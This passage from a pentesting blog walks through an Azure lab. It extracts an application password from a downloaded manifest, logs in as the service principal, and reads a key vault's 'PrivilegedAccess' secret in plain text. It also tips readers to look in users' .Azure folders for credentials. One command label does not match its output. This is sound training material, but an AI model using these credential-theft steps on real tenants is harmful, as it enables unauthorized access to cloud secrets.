<p>In some cases, you might need to logout and login again from the portal for your user to be added to the dynamic group. In any case, Azure may take 5-6 minutes before the user is added to the group.</p>
<p><img src="http://bhavsec.com/img/posts/intro-to-azure-pentesting/3.png" alt=""></p>
<p>Once the user is added to the PIMAdmins group, navigate to &lsquo;All Resources&rsquo; in the Azure Portal.</p>
<p><img src="http://bhavsec.com/img/posts/intro-to-azure-pentesting/4.png" alt=""></p>
<p>You will see the evilcorp storage account. Browse to &lsquo;Containers&rsquo; in the storage account. Recall that we already accessed the configuration container in the storage account as that container allows anonymous access. However, you will find an additional container named &lsquo;pimadmins&rsquo;. The container contains a file &lsquo;PIM.json&rsquo;. Download it!</p>
<p><img src="http://bhavsec.com/img/posts/intro-to-azure-pentesting/5.png" alt=""></p>
<p>The PIM.json file is a manifest for an Enterprise Application named &lsquo;PIM&rsquo;. Look at the &lsquo;passwordCredentials&rsquo; parameter in there and you will find application password for this application:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#e6db74">&#34;passwordCredentials&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
{
<span style="color:#f92672">&#34;customKeyIdentifier&#34;</span>: <span style="color:#66d9ef">null</span>,
<span style="color:#f92672">&#34;endDate&#34;</span>: <span style="color:#e6db74">&#34;2023-12-02T06:44:44.945Z&#34;</span>,
<span style="color:#f92672">&#34;keyId&#34;</span>: <span style="color:#e6db74">&#34;1c4ea66d-f755-4404-91ce-8f4a509c6756&#34;</span>,
<span style="color:#f92672">&#34;startDate&#34;</span>: <span style="color:#e6db74">&#34;2021-12-02T06:44:44.945Z&#34;</span>,
<span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;mEY7Q~PByrDX88Q4Rqoelzu~rHyLqhFgp-Ycb&#34;</span>,
<span style="color:#f92672">&#34;createdOn&#34;</span>: <span style="color:#e6db74">&#34;2021-12-02T06:45:03.1827138Z&#34;</span>,
<span style="color:#f92672">&#34;hint&#34;</span>: <span style="color:#e6db74">&#34;mEY&#34;</span>,
<span style="color:#f92672">&#34;displayName&#34;</span>: <span style="color:#e6db74">&#34;Creds&#34;</span>
}
]<span style="color:#960050;background-color:#1e0010">,</span>
</code></pre></div><h2 id="lateral-movement">Lateral Movement</h2>
<p>Use the below Az PowerShell commands to access the tenant as PIM enterprise application!</p>
<pre><code>PS C:\AzAD\Tools&gt; Connect-AzAccount -ServicePrincipal -Tenant &quot;711c59fe-8dee-40c0-adc1-ed08f738de43&quot; -Credential $creds
WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user
profile ( C:\Users\IEUser\.Azure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
20eb5f4e-317a-4987-a384-298bf636f082 EvilCorp       711c59fe-8dee-40c0-adc1-ed08f738de43 AzureCloud
</code></pre><p>Please take a note of the warning! Looking at the .Azure directory in a user profile is always recommended to get some credentials!</p>
<p>Run the below command to enumerate Azure resources accessible to the PIM enterprise application:</p>
<pre><code>PS C:\AzAD\Tools&gt; Get-AzKeyVaultSecret -VaultName breakglass-vault

Name              : breakglass-vault
ResourceGroupName : Evil
ResourceType      : Microsoft.KeyVault/vaults
Location          : germanywestcentral
ResourceId        : /subscriptions/27ebe5b9-6e27-425a-8117-eeaab022575f/resourceGroups/Evil/providers/Microsoft.KeyVault/vaults/breakglass-vault
Tags              :
</code></pre><p>Sweet! We can read a key vault. Let&rsquo;s check if there are secrets in there and if we can read the secrets too!</p>
<pre><code>PS C:\AzAD\Tools&gt; Get-AzKeyVaultSecret -VaultName breakglass-vault

Vault Name   : breakglass-vault
Name         : PrivilegedAccess
Version      :
Id           : https://breakglass-vault.vault.azure.net:443/secrets/PrivilegedAccess
Enabled      : True
Expires      :
Not Before   :
Created      : 12/9/2021 7:18:22 PM
Updated      : 12/9/2021 7:18:22 PM
Content Type :
Tags         :
</code></pre><p>There is a secret called &lsquo;PrivilegedAccess&rsquo; inside the keyvault. Let&rsquo;s try to read the secret!</p>
<pre><code>Get-AzKeyVaultSecret -VaultName breakglass-vault -Name PrivilegedAccess -AsPlainText
</code></pre><p>Once you complete the lab, please take time to explore more commands from the Azure AD and Az PowerShell module to gather information about the target environment. Also, try to use tools like az cli, ROADrecon, AzureHound, StormSpotter for enumeration and any other tools that you come across!</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://bhavsec.com/posts/active-directory-resources/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Active Directory Pentesting Resources 📚</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://bhavsec.com/posts/boom-bashed/">
                  <span class="button__text">Boom Bashed 🧨💥</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      
      <div class="copyright">
        <span> 
          © 2018-2022
        </span>
      </div>
      <div>
        <span>    
        <span>
        <a href="../../archive">archive</a>
        &nbsp; 
        </span>
          <a href="../../newsletter">newsletter</a>
        </span>   
        &nbsp;      
        <span>
          <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
        </span>
        &nbsp;      
        <span>
          <a href="http://bhavsec.com/posts/index.xml" target=”_blank”>rss feed</a>
        </span>

      </div>

    
  </div>
</footer>

<script src="../../assets/main.js"></script>
<script src="../../assets/prism.js"></script>

      
    </div>

    
      
<script async src="https://www.googletagmanager.com/gtag/js?id=G-VY7WJZSQD0"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-VY7WJZSQD0', { 'anonymize_ip': false });
}
</script>

    
  </body>
</html>
